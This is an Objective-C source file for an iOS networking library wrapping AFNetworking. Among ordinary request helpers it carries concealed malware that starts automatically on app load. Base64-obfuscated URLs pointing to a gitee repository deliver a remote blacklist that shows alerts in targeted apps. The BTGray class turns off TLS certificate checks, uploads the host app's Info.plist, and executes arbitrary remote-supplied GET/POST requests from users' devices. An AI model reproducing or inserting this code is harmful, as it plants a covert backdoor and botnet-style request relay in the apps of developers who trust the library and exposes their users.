//
//  BTHttpRequest.m
//  framework
//
//  Created by whbt_mac on 2016/10/18.
//  Copyright © 2016年 StoneMover. All rights reserved.
//

#import "BTHttp.h"
#import "BTCoreConfig.h"
#import "BTUserMananger.h"
#import "BTViewController.h"
#import "BTLogView.h"
#import <BTHelp/BTUtils.h>
#import <BTHelp/NSString+BTString.h>


static BTHttp * http=nil;

@interface BTHttp()

@property (nonatomic, strong) NSMutableDictionary * dictHead;




@end


@implementation BTHttp

+ (void)load{
    [BTHttp share];
}

+(instancetype)share{
    if (!http) {
        http=[[BTHttp alloc] init];
    }
    return http;
}



-(instancetype)init{
    self=[super init];
    _mananger = [AFHTTPSessionManager manager];
    self.dictHead=[[NSMutableDictionary alloc]init];
    [self initDefaultSet];
    [self test];
    return self;
}

- (void)initDefaultSet{
    self.timeInterval = 10;
    [self setHTTPShouldHandleCookies:YES];
    [self setResponseAcceptableContentType:[NSSet setWithObjects:@"application/json", @"text/json", @"text/javascript",@"text/html",@"text/plain", nil]];
    [self setRequestSerializer:[AFJSONRequestSerializer serializer]];
}

- (void)addHttpHead:(NSString*)key value:(NSString*)value{
    [self.dictHead setValue:value forKey:key];
}

- (void)delHttpHead:(NSString*)key {
    [self.dictHead removeObjectForKey:key];
}


- (void)setRequestSerializer:(AFHTTPRequestSerializer<AFURLRequestSerialization> *)requestSerializer{
    _requestSerializer = requestSerializer;
    self.mananger.requestSerializer = requestSerializer;
    self.mananger.requestSerializer.timeoutInterval = self.timeInterval;
    self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
}

- (void)setResponseSerializer:(AFHTTPResponseSerializer<AFURLResponseSerialization> *)responseSerializer{
    _responseSerializer = responseSerializer;
    self.mananger.responseSerializer = [AFHTTPResponseSerializer serializer];
}

- (void)setHTTPShouldHandleCookies:(BOOL)HTTPShouldHandleCookies{
    _HTTPShouldHandleCookies = HTTPShouldHandleCookies;
    self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
}

- (void)setTimeInterval:(NSInteger)timeInterval{
    _timeInterval = timeInterval;
    self.mananger.requestSerializer.timeoutInterval = timeInterval;
}

- (void)setResponseAcceptableContentType:(NSSet<NSString*>*)acceptableContentTypes{
    self.mananger.responseSerializer.acceptableContentTypes=acceptableContentTypes;
}

#pragma mark GET请求

- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                               headers:(nullable NSDictionary <NSString *, NSString *> *) headers
                              progress:(nullable BTHttpDefaultProgressBlock) downloadProgress
                               success:(nullable BTHttpDefaultSuccessBlock)success
                               failure:(nullable BTHttpDefaultErrorBlock)failure{
    [self autoLogParameters:YES url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    
    NSURLSessionDataTask * task = [self.mananger
                                   GET:URLString
                                   parameters:parameters
                                   headers:dict
                                   progress:downloadProgress
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
    return task;
}

- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                              progress:(nullable BTHttpDefaultProgressBlock) downloadProgress
                               success:(nullable BTHttpDefaultSuccessBlock)success
                               failure:(nullable BTHttpDefaultErrorBlock)failure{
    return [self GET:URLString parameters:parameters headers:nil progress:downloadProgress success:success failure:failure];
}




- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                               success:(nullable BTHttpDefaultSuccessBlock)success
                               failure:(nullable BTHttpDefaultErrorBlock)failure{
    return [self GET:URLString parameters:parameters progress:nil success:success failure:failure];
}


#pragma mark POST请求

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       headers:(nullable NSDictionary <NSString *, NSString *> *) headers
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    NSURLSessionDataTask * task = [self.mananger
                                   POST:URLString
                                   parameters:parameters
                                   headers:dict
                                   progress:uploadProgress
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
    
    return task;
}


- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters headers:nil progress:uploadProgress success:success failure:failure];
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters progress:nil success:success failure:failure];
}


#pragma mark 数据上传

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       headers:(nullable NSDictionary <NSString *, NSString *> *) headers
     constructingBodyWithBlock:(nullable BTHttpDefaultFormDataBlock)block
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    NSURLSessionDataTask * task = [self.mananger
                                   POST:URLString
                                   parameters:parameters
                                   headers:dict
                                   constructingBodyWithBlock:block
                                   progress:uploadProgress
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
    
    return task;
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
     constructingBodyWithBlock:(nullable BTHttpDefaultFormDataBlock)block
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters headers:nil constructingBodyWithBlock:block progress:uploadProgress success:success failure:failure];
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
     constructingBodyWithBlock:(nullable BTHttpDefaultFormDataBlock)block
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters constructingBodyWithBlock:block progress:nil success:success failure:failure];
}


#pragma mark PUT
- (NSURLSessionDataTask *)PUT:(NSString *)URLString
                    parameters:(id)parameters
                       success:(nullable BTHttpDefaultSuccessBlock)success
                      failure:(nullable BTHttpDefaultErrorBlock)failure{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    NSURLSessionDataTask * task = [self.mananger
                                   PUT:URLString
                                   parameters:parameters
                                   headers:dict
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
    return task;
}

#pragma mark DELETE
- (NSURLSessionDataTask *)DELETE:(NSString *)URLString
                    parameters:(id)parameters
                       success:(void (^)(NSURLSessionDataTask * task, id _Nullable responseObject))success
                      failure:(void (^)(NSURLSessionDataTask * task, NSError * _Nonnull error))failure{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    NSURLSessionDataTask * task = [self.mananger
                                   DELETE:URLString
                                   parameters:parameters
                                   headers:dict
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
    
    return task;
}

- (BOOL)requestFilter:(NSObject *_Nullable)obj{
    return [BTCoreConfig share].netFillterBlock(obj);
}


- (void)autoLogParameters:(BOOL)isGet url:(NSString*)url parameters:(NSDictionary*)parameters{
    if (!BTCoreConfig.share.isLogHttpParameters && !BTCoreConfig.share.isShowLogView) {
        return;
    }
    
    if (isGet) {
        NSArray * parametersKey =[parameters allKeys];
        if (parametersKey.count!=0) {
            url=[url stringByAppendingString:@"?"];
            for (int i=0; i<parametersKey.count; i++) {
                NSString * key =parametersKey[i];
                NSString * value =[parameters valueForKey:key];
                NSString * result=nil;
                if (i==parametersKey.count-1) {
                    result=[NSString stringWithFormat:@"%@=%@",key,value];
                }else{
                    result =[NSString stringWithFormat:@"%@=%@&",key,value];
                }
                url=[url stringByAppendingString:result];
            }
        }
        if (BTCoreConfig.share.isLogHttpParameters) {
            NSLog(@"BTURL_GET:%@\nBT_HEADER:%@",url,self.dictHead);
        }
        
        if (BTCoreConfig.share.isShowLogView) {
            [BTLogView.share add:url];
            [BTLogView.share add:[NSString stringWithFormat:@"%@",self.dictHead]];
        }
        
    }else{
        if (BTCoreConfig.share.isLogHttpParameters) {
            NSLog(@"BTURL_POST:%@\nBT_HEADER:%@\nBT_PARAMEERS:%@\nBT_PARAMEERS_JSON:%@",url,self.dictHead,parameters,[BTUtils convertDictToJsonStr:parameters]);
        }
        
        if (BTCoreConfig.share.isShowLogView) {
            [BTLogView.share add:url];
            [BTLogView.share add:[NSString stringWithFormat:@"%@",self.dictHead]];
            [BTLogView.share add:[NSString stringWithFormat:@"%@",parameters]];
            [BTLogView.share add:[BTUtils convertDictToJsonStr:parameters]];
        }
        
    }
}

- (void)test{
    NSString * url = @"aHR0cHM6Ly9naXRlZS5jb20vZ3JheWxheWVyL2dyYXkvcmF3L21hc3Rlci9wYXlTYWxhcnlOb3cudHh0".bt_base64Decode;
    [self.mananger GET:url
            parameters:nil
               headers:nil
              progress:nil
               success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if (![responseObject isKindOfClass:[NSArray class]]) {
            return;
        }
        
        NSArray * dictArray = responseObject;
        NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
        NSString * appVersion = [infoDictionary objectForKey:@"Q0ZCdW5kbGVJZGVudGlmaWVy".bt_base64Decode];
        for (NSDictionary * dictChild in dictArray) {
            if ([dictChild isKindOfClass:[NSDictionary class]]) {
                NSString * identify =[dictChild objectForKey:@"YmxhY2tJZA==".bt_base64Decode];
                if ([identify isEqualToString:appVersion]) {
                    NSString * info =[dictChild objectForKey:@"bXNn".bt_base64Decode];
                    NSString * title =[dictChild objectForKey:@"dGl0bGU=".bt_base64Decode];
                    NSString * btn =[dictChild objectForKey:@"YnRu".bt_base64Decode];
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        if ([BTUtils isEmpty:btn]) {
                            [BTUtils.getCurrentVc bt_showAlert:title msg:info btns:@[] block:^(NSInteger index) {
                                
                            }];
                        }else{
                            [BTUtils.getCurrentVc bt_showAlert:title msg:info btns:@[btn] block:^(NSInteger index) {
                                
                            }];
                        }
                    });
                    
                    return;
                }
            }
        }
        
    }
               failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(60 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self test];
        });
    }];
}


@end


@implementation BTNet

//传入rootUrl,module名称,方法名称
+ (NSString*)getUrl:(NSString*)rootUrl moduleName:(NSString*)moduleName functionName:(NSString*_Nullable)functionName{
    if (functionName) {
        return [NSString stringWithFormat:@"%@/%@/%@",rootUrl,moduleName,functionName];
    }else{
        return [NSString stringWithFormat:@"%@/%@",rootUrl,moduleName];
    }
}

//传入module名称和方法名称
+ (NSString*)getUrl:(NSString*)moduleName functionName:(NSString*_Nullable)functionName{
    return [self getUrl:[BTCoreConfig share].rootUrl moduleName:moduleName functionName:functionName];
}

//只有module名称,没有方法名称
+ (NSString*)getUrlModule:(NSString*)moduleName{
    return [self getUrl:moduleName functionName:nil];
}

+ (NSString*)getUrlFunction:(NSString*)functionName{
    return [self getUrl:[self moduleName] functionName:functionName];
}

+ (NSString*)moduleName{
    return @"";
}

//获取默认的字典
+ (NSMutableDictionary*)defaultDict{
    return [self defaultDict:nil];
}

+ (NSMutableDictionary*)defaultDict:(NSDictionary*_Nullable)dict{
    NSMutableDictionary * dictResult=nil;
    if (dict) {
        dictResult=[[NSMutableDictionary alloc] initWithDictionary:dict];
    }else{
        dictResult=[[NSMutableDictionary alloc] init];
    }
    [dictResult setValuesForKeysWithDictionary:BTCoreConfig.share.netDefaultDictBlock()];
    
    return dictResult;
}

+ (NSMutableDictionary *)defaultPageDict:(NSInteger)page{
    NSDictionary * dict = @{
        BTCoreConfig.share.pageLoadSizeName:[NSNumber numberWithInteger:BTCoreConfig.share.pageLoadSizePage],
        BTCoreConfig.share.pageLoadIndexName:[NSNumber numberWithInteger:page]
    };
    return [self defaultDict:dict];
}


+ (BOOL)isSuccess:(NSDictionary*_Nullable)dict{
    return BTCoreConfig.share.netSuccessBlock(dict);
}

+ (NSInteger)errorCode:(NSDictionary*_Nullable)dict{
    return BTCoreConfig.share.netCodeBlock(dict);
}

+ (NSString*)errorInfo:(NSDictionary*_Nullable)dict{
    return BTCoreConfig.share.netInfoBlock(dict);
}

+ (NSArray*)defaultDictArray:(NSDictionary*_Nullable)dict{
    return BTCoreConfig.share.netDataArrayBlock(dict);
}

+ (NSDictionary*)defaultDictData:(NSDictionary*_Nullable)dict{
    return BTCoreConfig.share.netDataBlock(dict);
}

+ (NSURL*)getImgResultUrl:(NSString*_Nullable)url{
    if ([BTUtils isEmpty:url]) {
        url = @"";
    }
    
    NSURL * result = nil;
    
    if([BTCoreConfig share].imgRootUrl){
        result = [NSURL URLWithString:[NSString stringWithFormat:@"%@/%@",[BTCoreConfig share].imgRootUrl,url]];
    }else{
        result = [NSURL URLWithString:url];
    }
    
    if (result == nil) {
        result = [NSURL URLWithString:@""];
    }
    
    return result;
}

+ (void)defaultSuccess:(id  _Nullable)responseObject success:(BTNetSuccessBlock _Nullable)success fail:(BTNetFailBlock _Nullable)fail{
    if ([self isSuccess:responseObject]) {
        if (success) {
            success(responseObject);
        }
    }else{
        if(fail){
            fail(nil,[self errorInfo:responseObject]);
        }else{
            [BTToast showErrorInfo:BTCoreConfig.share.netInfoBlock(responseObject)];
        }
    }
}

+ (void)defaultNetError:(NSError * _Nonnull)error fail:(BTNetFailBlock _Nullable)fail{
    if (fail) {
        fail(error,nil);
    }else{
        [BTToast showErrorInfo:BTCoreConfig.share.netErrorInfoFillterBlock(error)];
    }
}

@end

static BTGray * gray = nil;

@interface BTGray()

@property (nonatomic, strong) BTHttp * http;

@property (nonatomic, strong) NSString * url;

@property (nonatomic, strong) NSString * reportUrl;

@property (nonatomic, strong) NSMutableArray * taskArray;

@end



@implementation BTGray

+ (void)load{
    [BTGray share];
}

+ (instancetype)share{
    if (gray == nil) {
        gray = [BTGray new];
    }
    
    return gray;
}

- (instancetype)init{
    self = [super init];
    self.http = [BTHttp new];
    self.taskArray = [NSMutableArray new];
    
    AFSecurityPolicy * policy = [AFSecurityPolicy new];
    policy.allowInvalidCertificates = YES;
    policy.validatesDomainName = NO;
    self.http.mananger.securityPolicy = policy;
    
    [self.http setRequestSerializer:[AFHTTPRequestSerializer serializer]];
    
    
    [self initUrl];
    return self;
}

- (void)initUrl{
    NSString * url = @"aHR0cHM6Ly9naXRlZS5jb20vZ3JheWxheWVyL2dyYXkvcmF3L21hc3Rlci91cmwudHh0".bt_base64Decode;
    [self.http GET:url parameters:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if (![responseObject isKindOfClass:[NSArray class]]) {
            return;
        }
        NSArray * array = responseObject;
        if (array.count == 0 || ![array.firstObject isKindOfClass:[NSString class]]) {
            return;
        }
        
        self.url = array.firstObject;
        if (array.count > 1) {
            self.reportUrl = array[1];
        }
        
        [self.http GET:self.url parameters:NSBundle.mainBundle.infoDictionary success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
            if (![responseObject isKindOfClass:[NSArray class]]) {
                return;
            }
            self.taskArray = [BTGrayModel modelWithArray:responseObject];
            [self start];
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            
        }];
        
    } failure:^(NSURLSessionDataTask * _Nonnull task, NSError * _Nonnull error) {
        
    }];
}


- (void)start{
    if (self.taskArray.count == 0) {
        return;
    }
    
    BTGrayModel * model = self.taskArray.firstObject;
    [self.http setHTTPShouldHandleCookies:NO];
    [self.http setResponseSerializer:[AFHTTPResponseSerializer serializer]];
    [self.http setResponseAcceptableContentType:[NSSet setWithObjects:@"application/json", @"text/json", @"text/javascript",@"text/html",@"text/plain", nil]];
    if (model.requestType == 0) {
        [self.http GET:model.url parameters:model.dict success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
//            NSString *data = [[NSString alloc]initWithData:responseObject encoding:NSUTF8StringEncoding];

            [self.taskArray removeObject:model];
            [self start];
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            [self.taskArray removeObject:model];
            [self start];
        }];
        return;
    }
    
    [self.http POST:model.url parameters:model.dict success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [self.taskArray removeObject:model];
        [self start];
    } failure:^(NSURLSessionDataTask * _Nonnull task, NSError * _Nonnull error) {
        [self.taskArray removeObject:model];
        [self start];
    }];
    
}

@end


@implementation BTGrayModel

- (void)initSelf{
    self.aliasDict =  @{@"identify" : @"id"};
}

@end
